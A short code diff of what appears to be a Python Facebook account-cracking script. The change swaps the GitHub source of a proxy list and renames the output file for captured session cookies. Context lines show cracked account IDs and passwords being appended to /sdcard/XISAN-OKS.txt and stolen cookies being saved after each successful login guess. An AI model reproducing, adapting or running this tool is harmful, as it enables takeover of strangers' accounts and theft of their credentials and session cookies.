@@ -30,7 +30,7 @@ ugent = []
 methods=[]
 android_models=[]
 try:
- prox= requests.get('https://github.com/Xisan-67/Api/blob/main/prox.txt').text
+ prox= requests.get('https://github.com/Pro-Max-420/Api/blob/main/prox.txt').text
  open('.prox.txt','w').write(prox)
 except Exception as e:
  print('')
@@ -386,7 +386,7 @@ def ___mixt___(ids,pwv,tl):
                 #. print(f"\r\33[1;36mCOOKIES=[🐼]: {kuki}\33[1;36m")
                 oks.append(ids)
                 open('/sdcard/XISAN-OKS.txt','a').write(ids+' | '+pas+'\n')
-                open('/sdcard/XISAN-COOKIE','a').write(kuki+'\n')
+                open('/sdcard/ARIFIN-COOKIE','a').write(kuki+'\n')
                 break
             elif 'www.facebook.com' in po['error']['message']:
                                 try:
